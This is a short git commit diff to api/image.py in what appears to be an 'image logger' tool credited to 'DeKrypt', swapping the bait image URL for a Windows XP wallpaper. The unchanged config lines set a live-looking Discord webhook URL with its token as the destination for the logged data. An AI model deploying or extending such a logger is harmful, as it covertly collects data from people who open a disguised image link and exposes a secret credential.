17719117438d3af310f551c3073add6e69937dbc
maxdelhanty-hue <maxdelhanty@gmail.com>
2026-04-07 20:15:37 -0500

    Update image.py

--- api/image.py
+++ api/image.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1491233300931547147/Dk8AYHGioaQYEQ7cdwgfHDQSmeTdjYZZ3lSxlQXQIAUNqlf7NAt2jcknvYJeAAzD0VMw",
-    "image": "https://wallpaperaccess.com/full/3333109.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://images.techhive.com/images/artical/2014/04/windows-xp-bliss-desktop-image-100259888-orig.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
